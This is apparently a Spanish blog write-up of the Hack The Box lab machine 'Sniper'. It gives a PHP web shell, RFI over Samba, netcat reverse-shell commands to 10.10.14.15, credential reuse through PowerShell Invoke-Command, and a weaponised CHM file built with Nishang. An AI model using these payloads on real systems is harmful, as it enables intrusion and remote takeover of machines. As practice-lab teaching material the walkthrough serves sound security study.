---
layout: post
title: Sniper
date: 2022-11-23
categories: ["HTB", "LFI", "RFI", "CHM"]
thumbnail: "assets/images/Sniper.png"
---

# Sniper [ Hack The Box ]

### Reconocimiento

##### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 10.10.10.151 -oG allPorts`
- `nmap -sCV -p80,135,139,445,49667 10.10.10.151 -oN targeted`

No vemos nada interesante, sigamos investigando.

### Inspección

Cuando entramos en la página vemos varios apartados, sólo dos de ellos redireccionan a una ruta diferente del sistema, el apartado `Our Services` tiene un parámetro llamado `lang` el cual apunta a un archivo `PHP` de diferente idioma, vamos a ver si es vulnerable a `LFI`.

Para ello cambiaremos `lang=blog-en.php` por `lang=\windows\win.ini`, la página se nos queda en blanco, si inspeccionamos el código de la página veremos al final del todo el resultado, por lo que es vulnerable.

Vamos a probar si también es vulnerable a `RFI`. Para ello nos montaremos un servidor con el demonio de `Samba`, de lo contrario no funcionará. Crearé un archivo con una frase y lo meteré en la carpeta de `Samba`, teniendo esto cambiaremos el parámetro anterior por `lang=\\10.10.14.15\test.txt`.

Bien! Vemos que también es vulnerable a `RFI`, vamos a crearnos una Web Shell para poder ejecutar comandos en la Web, para ello crearemos el siguiente archivo en `PHP`:

```
<?php system($_REQUEST['cmd']); ?>
```

En mi caso lo llamé `cmd.php` para identificarlo mejor. Una vez creado lo llevamos a la carpeta compartida por `Samba` y cambiaremos de nuevo el parámetro `lang`.

- `http://10.10.10.151/blog?lang=\\10.10.14.15\share\cmd.php&cmd=whoami`


```
</html>
nt authority\iusr
</body>
</html>
```
Bien! Ya tenemos ejecución remota de comandos!

### Shell

Para obtener la Shell utilizaremos el archivo `PHP` que nos habíamos creado más `NC`,
de tal manera que el comando que ejecutaremos será NC para entablarnons la conexión.

Para ello utilicé la versión de `NC` de `32 bits`, el cual pude encontrar en [`GitHub`](https://github.com/int0x33/nc.exe/blob/master/nc.exe). Una vez descargado lo volveremos a copiar en la carpeta compartida de `Samba`.

Una vez todo lo anterior esté preparado nos pondremos en escucha por el puerto que queramos, en mi caso `4444`.

- `rlwrap -cAr nc -nlvp 4444`

Bien, ahora podemos pasar de nuevo a la web, pero ahora cambiaremos un poco el anterior comando, dejando el parámetro `lang` así:

```
lang=\\10.10.14.15\share\cmd.php&cmd=\\10.10.14.15\share\nc.exe -e cmd 10.10.14.15 4444
```

Tras unos segundos de espera veremos que nos pudimos entablar la conexión.

Fantástico! Ya estamos en la máquina como `IUSR`!

### Subida de privilegios #1

Bien, antes de ser administradores de la máquina tenemos que pasar por otro usuario, en este caso por `Chris`. Gracias a `C:\Users` pude ver a los usuarios, por eso sé que es `Chris`.

Con esto sabido inspeccionamos un poco el directorio `C:\inetpub\wwwroot\user`, vemo que hay un archivo llamado `db.php` el cual contiene una contraseña para conectarse a la Base de Datos. Nos copiamos la contraseña.

Una vez hecho esto nos pasamos a `PowerShell`, para ello ejecutamos `powershell` y ejecutamos `hostname` para ver el `HostName` de la máquina, ahora veremos para qué.

Para ver si la contraseña introducida es la correcta haremos lo siguiente:

```
PS C:\> $user = "Sniper\Chris"
PS C:\> $pass = "36mEAhz/B8xQ~2VM"
PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\> $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\> $cred = new-object -typename System.Management.Automation.PSCredential -
argumentlist $user, $secstr
PS C:\> Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
```

Como vemos al ejecutar el comando nos dice que somos `Chris`, por lo que la contraseña es correcta. Para ganar una Shell como `Chris` hay que hacerle un pequeño cambio al último comando ejecutado, de tal manera que llamaremos al `NC` que habíamos subido con anterioridad a `Samba`.

Antes de eso deberíamos ponernos en escucha con `NC`, en mi caso será por el puerto `443`. Ahora sí, podemos ejecutar el siguiente comando:

```
PS C:\> Invoke-Command -ScriptBlock { \\10.10.14.15\share\nc.exe -e cmd 10.10.14. 443 } -Credential $cred -Computer localhost
```
Estupendo! Ya tenemos una Shell como `Chris`!

### Subida de privilegios #2

Si nos vamos a la raíz veremos una carpeta llamada `Docs` y dentro de ella un archivo `TXT` con el nombre de `note.txt`. Vamos a mirar a ver qué nos dice:

> Hi Chris, Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.
>
> Regards, Sniper CEO.

Como vemos le está diciendo a `Chris` que sus habilidades en `PHP` son muy malas, que por favor hable con `YamiTenshi` para que él le haga clases. También le dice que espera que esté preparado para la documentación de la nueva app, que la suelte aquí cuando la haya terminado.

Si nos vamos a las descargas de `Chris` veremos un archivo llamado `instructions.chm`, si queremos ese archivo nos lo tenemos que pasar a nuestra máquina `Windows`.

Una vez nos lo hayamos pasado veremos un docuemnto, en verdad no tiene ningún tipo de relevancia más allá de que es un archivo `CHM` y `Nishang` tiene una herramienta ([`Out-Nishang`](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1)) que crea archivos `CMH` armados.

Para poder utilizar la herramienta nos la tenemos que descargar del repositorio de [`Nishang`](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1) e importarlo en `PowerShell`, para ello haremos lo siguiente en nuestra máquina `Windows`:

- `Import-Module .\Out-CHM.ps1`

Una vez hecho lo anterior podemos pasar al siguiente paso, crear nuestro archivo `CHM` malicioso, para ello ejecutaremos lo siguiente:

```
Out-CHM -Payload "\windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.14.15 4444" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

Como vemos estamos especificando una ruta, esa ruta será la que se utilizará en la máquina víctima y donde se alojará nuestro `NC`.

Se nos creará un `doc.chm`, lo vamos a pasar a nustra máquina de atacante y de ahí a la máquina víctima con `Samba`.

- `copy \\10.10.14.15\share\doc.chm \Docs\`

Bien, también nos copiaremos el `NC`, aunque en la carpeta que hayamos especificado antes:

```
copy \\10.10.14.15\share\nc.exe \windows\system32\spool\drivers\color\
```

Bien! Ya estamos listos, nos ponemos en escucha con `NC` por el puerto especificado anteriormente:

- `rlwrap -cAr nc -nlvp 4444`

Enhorabuena! Estamos en la máquina como `Administrator`! Esto se nos ha complicado un poco!
